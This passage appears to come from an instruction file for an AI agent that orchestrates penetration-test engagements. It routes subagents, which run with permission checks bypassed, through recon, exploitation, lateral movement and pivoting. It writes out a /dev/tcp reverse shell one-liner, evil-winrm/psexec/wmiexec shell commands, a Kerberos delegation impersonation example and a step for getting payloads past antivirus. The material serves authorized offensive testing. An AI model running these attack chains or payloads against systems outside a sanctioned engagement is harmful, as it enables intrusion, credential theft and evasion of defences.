    prompt="Load skill 'web-discovery'. Target: <URL>. Tech stack: <from recon>. Web proxy: <http://IP:PORT or 'disabled by operator'>. Source engagement/web-proxy.sh before every Bash-driven HTTP(S) command. If a proxy is configured, route all attackbox-originated HTTP(S) traffic through it, pass the same value to browser_open(proxy=...) or rely on engagement/web-proxy.json, and do not send direct requests outside the proxy.",
    description="Web discovery on <target>"
)
```

Do not execute ffuf, httpx, or nuclei commands inline.

### Host Enumeration (if domain environment suspected)

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`:

```
Agent(
    subagent_type="ad-discovery-agent",
    mode="bypassPermissions",
    prompt="Load skill 'ad-discovery'. DC: <IP>. Domain: <name>. Credentials: <creds>.",
    description="AD discovery on <domain>"
)
```

Do not execute netexec or ldapsearch commands inline.

### Update State

After each agent returns, parse the return summary and record findings using
state-writer MCP tools (`add_target`, `add_port`, `add_credential`, `add_vuln`,
etc.). Then call `get_state_summary()` to check for new findings before routing
to the next skill.

Log to `engagement/activity.md`:
```markdown
### [YYYY-MM-DD HH:MM:SS] orchestrator → recon
- Routed to network-recon → N open ports found
- Web services found: <list>
- Technologies: <list>
- Domain environment: yes/no
```

### Hostname Resolution Check

After recording targets from network-recon, check whether discovered domain
names and hostnames resolve on the attackbox:

1. Collect all hostnames from the recon results: domain name (e.g.,
   `megabank.local`), DC FQDNs (e.g., `DC01.megabank.local`), any other
   hostnames discovered via LDAP or SMB.
2. For each hostname, run `getent hosts <hostname>`.
3. If ANY hostname does not resolve, trigger the **Hosts File Update**
   hard stop (see Decision Logic) before routing to any further skills.

This check happens BEFORE web-discovery, AD-discovery, or any technique
skill. Many tools (Kerberos, LDAP, ffuf vhost scanning) fail silently or
with confusing errors when hostnames don't resolve — catching this early
prevents wasted agent invocations.

### Post-Web-Discovery Resolution Check

After web-discovery returns, if vhosts were found (e.g., `dev.target.htb`,
`admin.target.htb`), check whether each discovered hostname resolves:

1. Collect vhost names from the web-discovery return summary.
2. For each vhost, run `getent hosts <hostname>`.
3. If ANY vhost does not resolve, trigger the **Hosts File Update** hard
   stop before routing to web technique skills.

## Step 3: Attack Surface Mapping

Based on recon results, categorize the attack surface:

| Surface | Indicators | Agent → Skill |
|---------|-----------|---------------|
| Web application | HTTP/HTTPS, login forms, APIs | web-discovery-agent → `web-discovery` |
| Active Directory | LDAP (389/636), Kerberos (88), SMB domain | ad-discovery-agent → `ad-discovery` |
| Containers / K8s | Docker API (2375), K8s API (6443/8443), kubelet (10250), etcd (2379), or inside a container | linux-privesc-agent → `container-escapes` |
| Database | MySQL (3306), MSSQL (1433), PostgreSQL (5432) | Direct DB testing |
| Mail | SMTP (25/587), IMAP (143/993) | Credential attacks, phishing |
| SMB vulnerability | SMB (445) + confirmed CVE (MS08-067, MS17-010, SMBGhost, MS09-050) | network-recon-agent → `smb-exploitation` |
| File shares | SMB (445), NFS (2049) | Enumeration, sensitive files |
| Remote access | SSH (22), RDP (3389), WinRM (5985/5986) | password-spray-agent → `password-spraying` |
| Custom services | Non-standard ports | Manual investigation |

Present the attack surface map and ask which paths to pursue first. Recommend
starting with the highest-value targets.

## Step 4: Vulnerability Discovery & Exploitation

Route to discovery skills based on attack surface. Pass along:
- Target details (URL, IP, port, technology)
- Any credentials from scope or already discovered

### Web Applications

STOP. Spawn **web-discovery-agent** with skill `web-discovery`. Pass: target
URL, technology stack, any credentials, and the stored web proxy decision from
`engagement/scope.md` (`http://IP:PORT` or "disabled by operator"), and tell
the agent to source `engagement/web-proxy.sh` before Bash-driven HTTP(S)
commands. Do not execute ffuf, httpx, or nuclei commands inline.

### Active Directory

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`. Pass: DC IP,
domain name, any credentials. Do not execute netexec, ldapsearch,
or bloodhound commands inline.

### Credential Attacks

For services with authentication (SSH, RDP, SMB, web login):

When usernames have been discovered, the **Usernames Found** hard stop
(see Decision Logic below) handles spray decisions and intensity selection.
Do not spawn a spray agent directly from here — the hard stop will trigger
when usernames are recorded in state and present the operator with spray
options before spawning `password-spray-agent`.

## Step 5: Vulnerability Chaining

This is the critical orchestrator function. Call `get_state_summary()` and
analyze the Pivot Map to chain vulnerabilities for maximum impact.

### Chaining Strategy

Think through these chains systematically:

**Direct Access (no credentials needed):**
- SMB vulnerability confirmed → network-recon-agent(`smb-exploitation`) → SYSTEM shell
- SMB exploitation → SYSTEM → ad-exploit-agent(`credential-dumping`) → lateral movement

**Information → Access:**
- LFI reads config → credentials → database/service access
- SSRF reaches internal service → metadata credentials → cloud access
- XXE reads files → SSH keys or passwords → host access
- SQLi dumps users table → password reuse → admin panel

**Access → Deeper Access:**

Common chains that produce shell access on a host:
- Web shell / backdoor with default or discovered credentials → shell access
- Database access → xp_cmdshell (MSSQL) / UDF (MySQL) / COPY TO/FROM PROGRAM
  (PostgreSQL) → OS command execution → shell access
- JWT forgery → admin panel → file upload → web shell → shell access
- Deserialization RCE → service account → shell access
- Command injection confirmed → shell access
- File upload bypass → web shell → shell access

> **Shell access gained → stabilize → host discovery routing (mandatory).**
>
> When any chain above produces command execution on a host, follow this
> sequence before doing anything else:
>
> **1. Stabilize access — get an interactive shell via shell-server.**
> A webshell, blind RCE callback, or database command execution is NOT a stable
> shell. Before routing to discovery, catch a reverse shell using the MCP
> shell-server:
> 1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
> 2. Send a reverse shell payload through the current access method:
>    - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python, or nc
>    - Windows: PowerShell reverse shell, nc.exe, or `nishang/Invoke-PowerShellTcp.ps1`
> 3. Call `list_sessions()` to verify the connection arrived
> 4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
>
> If the target has no outbound connectivity, fall back to inline command
> execution and note the limitation via `add_blocked()`. If the subagent has
> shell-server MCP access, it can call these tools directly.
>
> **1b. Credential-based access — use `start_process`.**
> When the chain produces credentials rather than a callback, and the
> relevant service port is open (check engagement state):
> 1. WinRM (5985/5986): `start_process(command="evil-winrm -i TARGET -u user -p pass")`
> 2. SMB (445): `start_process(command="psexec.py DOMAIN/user:pass@TARGET")`
> 3. WMI (135): `start_process(command="wmiexec.py DOMAIN/user:pass@TARGET")`
> 4. SSH (22): `start_process(command="ssh user@TARGET")`
> 5. Verify: `send_command(session_id=..., command="whoami")`
> 6. Route to discovery as with reverse shells
>
> **Decision:** Have credentials + service port open? → `start_process`.
> Need callback from RCE? → `start_listener`.
>
> **File transfer via evil-winrm:** When WinRM is available (5985/5986 open),
> prefer evil-winrm for transferring tools and scripts to Windows targets.
> Its `upload`/`download` commands are more reliable than SMB file transfer.
>
> **2. Route to host discovery (mandatory on every host).**
> Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
> host enumeration commands inline. Spawn:
>
> - Linux target → STOP. Spawn **linux-privesc-agent** with skill `linux-discovery`.
> - Windows target → STOP. Spawn **windows-privesc-agent** with skill `windows-discovery`.
>
> Pass: target hostname/IP, current user, access method (specify: interactive
> reverse shell on port X, SSH session, WinRM, etc.), any
> credentials. The discovery skill enumerates systematically and returns findings
> — the orchestrator then decides which technique skill to invoke next (sudo/SUID
> abuse, cron/MOTD exploitation, kernel exploits, token impersonation, etc.).
>
> This applies every time new shell access is gained — including after lateral
> movement to a new host. **Host discovery runs on ALL hosts — including DCs.**
> DCs are Windows hosts with network interfaces, scheduled tasks, installed
> software, local services, and firewall rules that only host-level enumeration
> reveals. Skipping host discovery on DCs means missing additional NICs (critical
> for pivoting to internal subnets), Hyper-V infrastructure, stored credentials
> in scheduled tasks, and local privilege escalation vectors.
>
> **3. Additionally route to AD discovery on Domain Controllers.**
> After host discovery completes on a DC (detected by ports 88+389+3268), also
> spawn **ad-discovery-agent** with skill `ad-discovery`. AD discovery covers
> the AD-specific attack surface: ADCS templates, delegation, ACLs, Kerberos
> attacks, BloodHound paths. Host discovery and AD discovery are complementary
> — run both sequentially (host discovery first, then AD discovery).
>
> **File exfiltration:** When retrieving files from a target (loot, backups,
> configs, databases), follow the File Exfiltration decision tree in the skill
> template — prefer direct download (HTTP, SCP, SMB) over base64 encoding.

**Lateral Movement:**
- Credentials from one host → test against all others in scope
- Service account → ad-exploit-agent(`kerberos-roasting`) → more credentials
- Machine keys from IIS → ViewState RCE on other IIS sites
- Database link → linked server → second database
- Host access on new subnet → pivoting-agent(`pivoting-tunneling`) → then network-recon-agent(`network-recon`) on internal network

**Privilege Escalation:**
- Local admin → ad-exploit-agent(`credential-dumping`) → domain user
- Domain user → ad-exploit-agent(`kerberos-roasting`) → service accounts
- Service account → ad-exploit-agent(`kerberos-delegation`) → domain admin
- ADCS misconfiguration → ad-exploit-agent(`adcs-template-abuse`/`adcs-access-and-relay`) → domain admin
- Containerized shell → linux-privesc-agent(`container-escapes`) → host access → linux-privesc-agent(`linux-discovery`)/windows-privesc-agent(`windows-discovery`)

### Decision Logic

When reading the state summary (via `get_state_summary()`), the orchestrator should:

1. **Check for unexploited vulns** — spawn the appropriate agent with the
   technique skill (look up in Skill-to-Agent Routing Table).

   **CVE verification gate:** When a discovery agent returns a specific CVE
   identifier as part of its routing recommendation, do NOT blindly trust the
   vulnerability class label. Before routing to a technique skill, spawn a
   general-purpose research agent (Opus model) to confirm the CVE's actual
   vulnerability class:
   ```
   Agent(
       prompt="Research CVE-XXXX-XXXXX. What is the exact vulnerability class
       (SSRF, file write, path traversal, deserialization, injection, etc.)?
       What component/parameter is affected? Is there a public PoC? Return:
       vulnerability class, affected endpoint, and exploitation methodology.",
       description="CVE research: CVE-XXXX-XXXXX",
       model="opus"
   )
   ```
   If the research confirms the class matches the discovery agent's label →
   route normally. If the class is different → route to the correct technique
   skill. This adds ~1-2 minutes but prevents misrouting entire agent
   invocations to the wrong skill.

   This is a normal routing decision — include it in parallelization
   opportunities. The research agent can run alongside other independent
   paths (e.g., password spray, other discovery phases)
2. **Check for shell access without root/SYSTEM** — if the Access section shows
   a non-root shell on Linux or non-SYSTEM/non-admin shell on Windows, route to
   the appropriate discovery agent. Do not enumerate privilege escalation vectors
   inline.

   **Host discovery is mandatory on every host with shell access.** Always
   spawn the appropriate host discovery agent first:
   - Windows target → **windows-privesc-agent** with `windows-discovery`
   - Linux target → **linux-privesc-agent** with `linux-discovery`

   **DC detection heuristic**: If the target has ports 88 (Kerberos) + 389/636
   (LDAP) + 3268/3269 (Global Catalog), it is a Domain Controller. After
   host discovery completes, **additionally** route to **ad-discovery-agent**
   with `ad-discovery`. DCs need BOTH:
   - **Host discovery** (windows-discovery): network interfaces, routes,
     ARP cache, scheduled tasks, installed software, services, firewall
     rules, local privesc vectors — everything WinPEAS covers. This reveals
     additional NICs and internal subnets (critical for pivoting), Hyper-V
     infrastructure, stored credentials, and local attack surface.
   - **AD discovery** (ad-discovery): ADCS templates, delegation, ACLs,
     Kerberos attacks, BloodHound paths — the AD-specific attack surface.

   Run them sequentially: host discovery first (reveals network topology),
   then AD discovery (maps AD attack paths). Never skip host discovery on
   a DC — it's the only way to find additional network interfaces for
   pivoting to internal subnets.
3. **Check for unchained access** — can existing access reach new targets?
4. **Check credentials** — have all found credentials been tested against all
   services?
5. **Check for uncracked hashes** — if the Credentials section contains hashes
   without plaintext (NTLM, Kerberos TGS, shadow, etc.) or the engagement has
   encrypted files (ZIP, Office, KeePass, SSH keys, password-protected
   archives), trigger the **Hashes Found** hard stop (see below). This
   includes encrypted SSH private keys discovered in file shares, buckets, or
   backups — these are cracking problems and the operator may prefer an
   external rig with GPU acceleration. Cracked passwords unlock new testing
   against all services. The cracking agent runs in parallel with other
   technique skills when possible (e.g., cracking + ACL abuse toward the same
   account).
6. **Check pivot map** — are there identified paths not yet followed?
   For pivots with `status: "identified"` and method containing "pivot candidate"
   or "Additional NIC":
   a. Check `get_tunnels()` — does an active tunnel already cover this subnet?
   b. If no tunnel covers the target subnet, spawn **pivoting-agent** with
      `pivoting-tunneling`:
      ```
      Agent(
          subagent_type="pivoting-agent",
          mode="bypassPermissions",
          prompt="Load skill 'pivoting-tunneling'. Pivot host: <host>. Target subnet: <subnet>. Access: <ssh/shell/winrm + user + creds>. Tool preference: SSH > sshuttle > ligolo > chisel.",
          description="Pivoting to <subnet> via <host>"
      )
      ```
   c. After pivoting-agent returns with tunnel established:
      - Record tunnel via `add_tunnel()` if the agent didn't already (check state)
      - Update the pivot status to `exploited` via `update_pivot()`
      - Spawn **network-recon-agent** with `network-recon` on the internal subnet
   d. **Tunnel context in subsequent agent prompts.** After a tunnel is
      established, ALL agent prompts targeting hosts behind that tunnel must
      include:
      - Whether the tunnel is transparent (sshuttle, ligolo, ssh_tun) or
        requires proxychains (ssh -D, chisel SOCKS)
      - The local SOCKS endpoint if proxychains is required (e.g.,
        `socks5://127.0.0.1:1080`)
      - Example: *"Tunnel active: ligolo via 10.10.10.5 → 172.16.0.0/24
        (transparent — tools work natively, no proxychains needed)."*
   e. **Tunnel health check.** Before spawning any agent targeting an internal
      host behind a tunnel, call `get_tunnels(status="active")` and verify the
      tunnel covering that subnet is still active. If the tunnel is down/closed,
      re-spawn pivoting-agent to re-establish it before proceeding.
7. **Check blocked items** — two categories:
   a. **`retry: "with_context"`** — these are techniques blocked at the
      discovery phase that have a corresponding technique skill with deeper
      bypass methodology. Route to the technique skill and let it exhaust
      its full methodology before accepting the block. Example: web-discovery
      reports "PHP upload blocked by content inspection" → route to
      web-exploit-agent with `file-upload-bypass` to try alternative
      extensions, .htaccess, magic bytes, polyglots, etc.
   b. **`retry: "later"`** — context has changed (new credentials, new
      access, different network position). Retry with updated context.
   c. **`retry: "no"`** — technique skill exhausted its methodology. Only
      revisit if fundamentally new access is gained (e.g., admin creds,
      different host).
8. **Assess progress toward objectives** — are we closer to the goal defined
   in scope.md?
9. **No hardcoded route matches** — if the scenario doesn't match any routing
   above, use dynamic search:
   a. Call `search_skills("description of what you need")` — results below 0.4
      similarity are filtered automatically.
   b. **Validate before loading**: Read the returned description for each
      result. Does it match the current scenario? A high similarity score
      does not guarantee relevance — the embedding model can confuse adjacent
      techniques (e.g., SSRF/CSRF, IDOR/ACL-abuse). If the description
      doesn't fit, skip it and check the next result or try a different query.
   c. Look up the skill in the Skill-to-Agent Routing Table and spawn the
      appropriate domain agent. If the skill isn't in the table, determine
      the domain (web/ad/privesc/network) from its category and use the
      corresponding agent.
   d. If no search result is relevant, proceed with general methodology and
      note the coverage gap in `engagement/activity.md`.

### Parallel Path Selection (Default)

**Parallelization is the default, not the exception.** When 2+ viable paths
exist at any decision point — initial foothold, lateral movement, privilege
escalation, credential acquisition — always suggest running the top paths in
parallel. Present them via the **Parallel Path Presentation** format with
"Run in parallel" as the recommended option.

No hard limit on parallel agents — run as many viable paths as exist. In
practice this is typically 2–3. The only constraint is independence.

**Only go sequential when forced:**
- Single viable path — nothing else to run
- Hard dependency — path B needs output from path A
- Resource contention — same authenticated session, same port binding, same
  AD object mutation (two agents writing to the same DACL, two exploits
  binding the same port, etc.)

Everything else runs in parallel. Don't overthink it — if two things can
run at the same time without stepping on each other, suggest parallel.

**Examples:**

| Scenario | Parallel? | Why |
|----------|-----------|-----|
| Kerberoast cracking + ACL abuse → both target `management_svc` creds | Yes | Independent (local cracking vs LDAP/Kerberos) |
| ADCS ESC1 + ADCS ESC4 → both target DA certificate | Yes | Different CAs/templates, independent |
| File upload bypass + SSRF → both target initial foothold | Yes | Different vectors, no shared resources |
| SQLi data extraction + SSRF to internal service | Yes | Different goals, no shared resources |
| Web shell upload + deserialization RCE → both target shell | Yes | Independent vectors |
| Two SQLi payloads against the same parameter | No | Same resource (web session/parameter) |
| Kerberoasting → then pass-the-hash with cracked cred | No | Dependency chain — path B requires path A output |

Present viable paths to the operator via the **Parallel Path Presentation**
format above.

### Parallel Execution

When running multiple paths in parallel, use background agents.

#### 1. Log the Decision

Append to `engagement/activity.md`:
```
### [YYYY-MM-DD HH:MM:SS] orchestrator → PARALLEL
- Path A: <skill-name> (confidence: <high/medium/low>, OPSEC: <low/medium/high>)
- Path B: <skill-name> (confidence: <high/medium/low>, OPSEC: <low/medium/high>)
- Reason: <brief rationale>
```

#### 2. Spawn All Agents

Use the Agent tool with `run_in_background: true` for each path. **Spawn
all agents in a single message** — this ensures true parallel execution.

- Pass normal context: skill name, target info, mode, relevant state summary.

#### 3. Wait for First Return

Background agents auto-notify on completion. The event watcher runs alongside
parallel agents — if the watcher fires with actionable findings before any
agent completes, the orchestrator can act on them (spawn follow-up agents, ask
the operator). However, **watcher notifications do NOT resolve the parallel
run** — resolution still requires an agent to complete and return. Spawn a new
watcher after processing each notification.

#### 4. Race Resolution

When an agent returns, apply the standard Post-Skill Checkpoint steps 0–6
(poll events, parse, dedup, record state, record workarounds, log activity, log findings). Then resolve:

**Case 1 — Succeeded:**
The returning agent achieved its goal (credential obtained, access gained,
foothold established).
1. Record all findings via state-writer MCP tools.
2. `TaskStop` the other running agent(s) pursuing the same goal.
3. Check the killed agent's partial output (via `TaskOutput` with
   `block: false`) for bonus findings — credentials, hosts, or vulns discovered
   before termination. Record any useful partial findings.
4. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → PARALLEL RESOLVED
   - Winner: Path <X> (<skill-name>)
   - Result: <what was obtained>
   - Killed: Path <Y> (<skill-name>) — partial findings: <none | brief summary>
   ```
5. Resume the normal orchestrator loop (call `get_state_summary()`, run
   decision logic, route to next skill).

**Case 2 — No winner yet:**
The returning agent completed but did NOT achieve its goal (e.g.,
Kerberoasting returned no crackable hashes).
1. Record any findings from the completed agent.
2. Let the other agent(s) continue — do not kill them.
3. Block on the next agent's return.
4. Log `PARALLEL PARTIAL` to activity.md with what was learned.
5. When the last agent returns, resolve normally — if the goal is achieved,
   log `PARALLEL RESOLVED`. If all paths failed, log `PARALLEL FAILED` and
   fall through to the decision logic to find an alternative approach.

**Case 3 — Multiple succeed:**
Multiple agents achieve the goal (rare but possible).
1. Record findings from both agents.
2. Use the more advantageous result: prefer reusable credentials over one-time
   access, prefer higher privilege over lower, prefer quieter over noisier.
3. Log `PARALLEL RESOLVED (multiple succeeded)` with which result was preferred
   and why.
4. Resume the normal orchestrator loop.

#### 5. State Consistency Rules

- **All agents** use state-interim MCP and can write 5 add-only tables
  mid-run: credentials, vulns, pivots, blocked, tunnels. This ensures
  critical discoveries (captured hashes, confirmed vulns, new pivot paths)
  reach the orchestrator immediately via event watcher — not just at agent
  return.
- The orchestrator processes agent returns **one at a time**, even when agents
  ran in parallel. It deduplicates findings that agents already wrote via
  interim before recording remaining state changes.
- Evidence filenames are skill-prefixed (e.g., `kerberoasting-tgs-hashes.txt`,
  `acl-abuse-dacl-modify.log`) — no collision risk from parallel agents.
- SQLite WAL mode + busy_timeout handles concurrent readers and interim
  writers safely. No write conflicts are possible because interim agents
  only INSERT (never UPDATE) and the orchestrator serializes its writes.

### Clock Skew Recovery

When an AD skill returns with `KRB_AP_ERR_SKEW` or clock skew as the failure
reason, follow this two-attempt recovery flow. The first attempt uses standard
clock sync + agent retry. The second attempt (if the first fails due to clock
drift during agent startup latency) produces an **atomic script** that syncs
and runs the exploit command in one shot — eliminating the latency gap.

#### Attempt 1: Standard Sync + Agent Retry

1. Write a temporary script to the working directory:
   ```bash
   #!/usr/bin/env bash
   set -euo pipefail
   DC_IP="<DC_IP from engagement state>"

   # Disable VirtualBox time sync if running (it fights ntpdate)
   if pgrep -x VBoxService >/dev/null 2>&1; then
       echo "[*] Disabling VirtualBox time sync..."
       killall VBoxService 2>/dev/null
       VBoxService --disable-timesync &
       sleep 1
   fi

   # Sync and keep syncing (clock drifts back without a loop)
   echo "[*] Syncing clock with $DC_IP every 5s (Ctrl-C to stop)..."
   while true; do
       ntpdate "$DC_IP" || rdate -n "$DC_IP"
       sleep 5
   done
   ```
   Save as `temp_clock-sync.sh` and `chmod +x temp_clock-sync.sh`.
2. Present to the user:
   > Clock skew detected — Kerberos authentication requires clocks within 5
   > minutes of the DC. Run `sudo bash ./temp_clock-sync.sh &` to sync in
   > the background, then confirm. The script disables VirtualBox time sync
   > (if running) and loops ntpdate every 5 seconds to prevent drift.
3. Wait for the user to confirm clock is synced before retrying (sudo
   requirement — always a hard stop).
4. After user confirms clock is synced, retry the **same skill invocation**
   with identical parameters (same agent, same skill, same target context).
5. Clean up: `rm temp_clock-sync.sh` after successful retry.
6. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → clock-skew recovery (attempt 1)
   - KRB_AP_ERR_SKEW detected during <skill-name>
   - Clock synced via ntpdate, retrying skill
   ```

#### Attempt 2: Atomic Sync + Exploit Script

If the retried agent returns with `KRB_AP_ERR_SKEW` **again** — the clock is
drifting faster than agent startup latency allows — switch to an atomic script.
The problem: spawning an agent takes minutes (skill loading, context building,
tool calls), during which the clock drifts back out of the 5-minute Kerberos
window. The fix: a single script that syncs the clock and runs the Kerberos
command with zero gap between them.

1. Extract the **exact command** that failed from the agent's return summary.
   The agent's Clock Skew Interrupt should include the commands that were
   attempted. If not, reconstruct from the skill's methodology and the
   engagement context (credentials, SPNs, target IPs).

2. Write `temp_clock-attack.sh` with both the sync and the exploit command:
   ```bash
   #!/usr/bin/env bash
   set -euo pipefail
   DC_IP="<DC_IP>"
   EVIDENCE_DIR="<absolute path to engagement/evidence>"

   echo "[*] Syncing clock with DC..."
   sudo ntpdate "$DC_IP" || sudo rdate -n "$DC_IP"
   echo "[+] Clock synced — running attack immediately"

   # === THE KERBEROS COMMAND(S) ===
   # Paste the exact command(s) from the skill methodology.
   # Example for constrained delegation:
   #   getST.py -spn 'WWW/dc.target.htb' -impersonate Administrator \
   #     -hashes ':NTHASH' -dc-ip "$DC_IP" 'domain.htb/svc_account$'
   #   export KRB5CCNAME=Administrator@WWW_dc.target.htb@DOMAIN.HTB.ccache
   #   wmiexec.py -k -no-pass domain.htb/Administrator@dc.target.htb
   <COMMANDS HERE>
   ```
   Save as `temp_clock-attack.sh` and `chmod +x temp_clock-attack.sh`.

3. Present to the user:
   > Clock drifted again during agent startup. This target's clock moves too
   > fast for the agent retry model. Here's an atomic script that syncs the
   > clock and runs the Kerberos command immediately — no gap.
   >
   > Review and run: `sudo bash ./temp_clock-attack.sh`
   >
   > If the command produces a `.ccache` file, let me know and I'll continue
   > the chain (shell via wmiexec/psexec using the ticket).

4. After user confirms the script ran:
   - Parse the output — check for ticket files, shell access, errors
   - If a `.ccache` file was produced, the orchestrator can continue the
     chain: establish a shell using `start_process` with the ticket
     (e.g., `wmiexec.py -k -no-pass`), or route to the next skill
   - If the command itself was a shell command (wmiexec, psexec), ask
     the user for the output (whoami, flags, etc.) and record access
   - Record all findings via state-writer MCP tools as normal

5. Clean up: `rm temp_clock-sync.sh temp_clock-attack.sh` after success.

6. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → clock-skew recovery (attempt 2 — atomic script)
   - Agent retry failed — clock drifting faster than agent startup latency
   - Produced atomic sync+exploit script for operator
   - Result: <outcome>
   ```

**Important:** The atomic script is a **fallback**, not the default. Always
try the standard sync + agent retry first — it preserves the normal agent
model with full skill methodology, evidence saving, and structured return.
The atomic script sacrifices agent-managed execution for timing precision.

### AV Evasion Recovery

When a technique agent returns with an "AV/EDR Blocked" section in its summary:

1. Record the blocked technique via `add_blocked()`:
   - technique: the original skill name
   - reason: "Payload caught by AV/EDR: \<details from agent return\>"
   - host: target host
   - retry: "with_context" (retryable after evasion)

2. Spawn **evasion-agent** with skill `av-edr-evasion`:
   ```
   Agent(
       subagent_type="evasion-agent",
       mode="bypassPermissions",
       prompt="Load skill 'av-edr-evasion'. Context: <paste AV-blocked section
       from agent return>. Build an AV-safe payload that meets the requirements.
       Target: <IP>.",
       description="AV evasion for <technique> on <target>"
   )
   ```

3. When evasion-agent returns with bypass artifact:
   - Record the bypass method in `engagement/activity.md`
   - Re-invoke the **original agent** with the **same skill** plus evasion context:
     ```
     Agent(
         subagent_type="<original-agent>",
         mode="bypassPermissions",
         prompt="Load skill '<original-skill>'. Target: <IP>. IMPORTANT: Your previous payload was caught by AV. Use this AV-safe
         payload instead: <artifact path>. Method: <bypass method>.
         Runtime prerequisites: <if any, e.g., AMSI bypass command>.
         Do NOT generate a new payload — use the provided one.",
         description="Retry <technique> with AV-safe payload on <target>"
     )
     ```

4. If the evasion agent itself fails (no bypass found), record as permanently
   blocked via `add_blocked()` with retry: "no" and move to the next attack
   vector.

5. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → av-evasion recovery
   - AV blocked <skill-name> on <target>: <detection details>
   - Routed to evasion-agent → <outcome>
   ```

### Web Proxy Setup

When HTTP/HTTPS services are found, the orchestrator MUST trigger this hard
stop **before** spawning `web-discovery-agent` or `web-exploit-agent`, unless
`engagement/scope.md` already records a `## Web Proxy` decision.

**This is the first prompt after web ports are identified.** Do not ask about
vhosts, attack paths, or exploitation until the operator explicitly chooses to
proxy web traffic through Burp or skip proxying.

**Purpose:** Capture attackbox-originated HTTP(S) traffic in Burp Suite while
preserving operator control over listener binding and port selection. This
applies to browser-server sessions and CLI web tooling (`curl`, `ffuf`,
`wpscan`, `sqlmap`, etc.) that originate from the attackbox. It does **not**
apply to reverse shells, nmap, or non-HTTP protocols.

**Persistence helpers:** The orchestrator should keep the choice in three
places:
- `engagement/scope.md` — operator-readable record
- `engagement/web-proxy.json` — machine-readable default for browser-server
- `engagement/web-proxy.sh` — shell snippet that web agents source before
  Bash-driven HTTP(S) commands

**When to trigger:**
- Immediately after recon records any HTTP/HTTPS service or web URL
- Before the first `web-discovery-agent` spawn of the engagement
- Before any later `web-exploit-agent` spawn if no proxy decision is recorded
- On resume when web work is pending and `scope.md` has no `## Web Proxy`
  section or only an undecided placeholder

**Hard stop procedure:**

1. Collect the discovered web services (host, port, scheme, service banner)
2. Read `engagement/scope.md`
3. If `scope.md` already contains a concrete `## Web Proxy` decision:
   - `Enabled: yes` with a listener URL → reuse it, include it in future web
     agent prompts, and continue without re-asking
   - `Enabled: no` → continue without re-asking and pass
     `Web proxy: disabled by operator` to future web agents
4. Otherwise, present the hard stop context:
   ```
   [orchestrator] HARD STOP — web proxy decision required

   HTTP/HTTPS services were discovered:
     - https://target1:443
     - http://target2:8080

   Before web discovery starts, decide whether to route attackbox-originated
   HTTP(S) traffic through Burp Suite for request/response capture.
   ```
5. Use `AskUserQuestion` with **two questions**:

   **Question 1 — Proxy location** (single-select):
   - Header: "Web proxy"
   - Options:
     - Loopback listener (Recommended) — use Burp on `127.0.0.1`
     - Dedicated proxy IP — bind Burp to another attackbox IP (enter the IP in `Other`)
     - No proxy — send web traffic directly

   **Question 2 — Listener port** (single-select):
   - Header: "Proxy port"
   - Options:
     - 8080 (Recommended) — default Burp listener
     - 8081 — alternate listener
     - Custom port — enter a different port in `Other`

   Parsing rules:
   - If **Loopback listener** is selected, use IP `127.0.0.1`
   - If **Dedicated proxy IP** is selected, read the IP from that question's
     `Other` text input; if none is provided, hard stop and ask again
   - If **No proxy** is selected, ignore the port question
   - If **Custom port** is selected, read the port from the port question's
     `Other` text input; if invalid or missing, hard stop and ask again

6. After the operator responds:
   - **No proxy**:
     - Update `engagement/scope.md`:
       ```markdown
       ## Web Proxy
       - Enabled: no
       - Listener: none
       - Decision: operator skipped Burp capture
       ```
     - Append to `engagement/activity.md`:
       ```
       ### [YYYY-MM-DD HH:MM:SS] orchestrator → web-proxy
       - HTTP/HTTPS services found on <targets>
       - Operator chose direct web traffic (no Burp proxy)
       ```
     - Write `engagement/web-proxy.json`:
       ```json
       {"enabled": false, "proxy_url": ""}
       ```
     - Write `engagement/web-proxy.sh`:
       ```bash
       #!/usr/bin/env bash
       unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY all_proxy ALL_PROXY
       export RR_WEB_PROXY_ENABLED=0
       export RR_WEB_PROXY_URL=
       ```
     - Continue to web-discovery with `Web proxy: disabled by operator`

   - **Loopback listener** or **Dedicated proxy IP**:
     - Build the listener URL as `http://<ip>:<port>`
     - Present a confirmation hard stop:
       ```
       [orchestrator] HARD STOP — start Burp listener

       Configure Burp Suite Proxy → Options → Proxy listeners to listen on:
         http://<ip>:<port>

       Confirm when the listener is up. No web agent will be spawned until the
       Burp listener is ready.
       ```
     - Wait for explicit operator confirmation
     - Update `engagement/scope.md`:
       ```markdown
       ## Web Proxy
       - Enabled: yes
       - Listener: http://<ip>:<port>
       - Binding: <loopback|dedicated>
       ```
     - Append to `engagement/activity.md`:
       ```
       ### [YYYY-MM-DD HH:MM:SS] orchestrator → web-proxy
       - HTTP/HTTPS services found on <targets>
       - Burp listener configured: http://<ip>:<port> (<loopback|dedicated>)
       ```
     - Write `engagement/web-proxy.json`:
       ```json
       {"enabled": true, "proxy_url": "http://<ip>:<port>"}
       ```
     - Write `engagement/web-proxy.sh`:
       ```bash
       #!/usr/bin/env bash
       export RR_WEB_PROXY_ENABLED=1
       export RR_WEB_PROXY_URL='http://<ip>:<port>'
       export http_proxy="$RR_WEB_PROXY_URL"
       export https_proxy="$RR_WEB_PROXY_URL"
       export HTTP_PROXY="$RR_WEB_PROXY_URL"
       export HTTPS_PROXY="$RR_WEB_PROXY_URL"
       export all_proxy="$RR_WEB_PROXY_URL"
       export ALL_PROXY="$RR_WEB_PROXY_URL"
       ```

7. For every subsequent web agent prompt in this engagement:
   - If enabled, include `Web proxy: http://<ip>:<port>`
   - If disabled, include `Web proxy: disabled by operator`
   - Tell the agent to source `engagement/web-proxy.sh` before every
     Bash-driven HTTP(S) command
8. Do not spawn any web agent until this procedure is complete

### Hosts File Update

When a subagent returns with domain names, DC FQDNs, vhosts, or DNS resolution
failures, the orchestrator must ensure all discovered hostnames resolve on the
